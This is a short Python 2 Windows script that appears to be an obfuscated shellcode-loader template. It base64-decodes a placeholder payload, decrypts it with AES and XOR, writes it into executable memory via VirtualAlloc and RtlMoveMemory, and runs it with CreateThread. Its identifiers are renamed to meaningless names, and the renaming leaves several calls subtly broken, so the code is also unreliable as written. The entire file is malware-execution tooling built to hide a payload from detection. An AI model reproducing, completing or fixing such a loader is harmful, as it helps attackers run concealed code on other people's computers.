from ctypes import c_int, windll, pointer, c_char
import hashlib
from Crypto.Cipher import AES
from base64 import b64decode
from itertools import cycle, izip
def fonk1(ciphertext, b2):
    b1 = ''
    for x, y in izip(b64decode(ciphertext), cycle(b2)):
        b1 += chr(ord(x) ^ ord(y))
    return b1
class class1:
    def fonk2(self, b2):
        self.b2 = hashlib.sha256(b2.encode('utf-8')).digest()
        self.b3 = AES.b3
    def fonk3(self, ciphertext):
        b4 = b64decode(ciphertext)
        b5 = AES.new(self.b2, AES.MODE_CBC, b4[:self.b3])
        b6 = b5.fonk3(b4[self.b3:]).rstrip(b'\x00').decode('utf-8')
        return b6
b7 = '---CIPHER---'
b8 = '---b8---'
b9 = '---XORKEY---'
b10 = class1(b7)
b11 = fonk1(b10.fonk3(b8), b9)
b12 = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(b11)), c_int(0x3000), c_int(0x40))
b13 = (c_char * len(b11)).from_buffer(b11.encode('utf-8'))
windll.kernel32.RtlMoveMemory(c_int(b12), b13, c_int(len(b11)))
b14 = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(b12), c_int(0), c_int(0), pointer(c_int(0)))
windll.kernel32.WaitForSingleObject(c_int(b14), c_int(-1))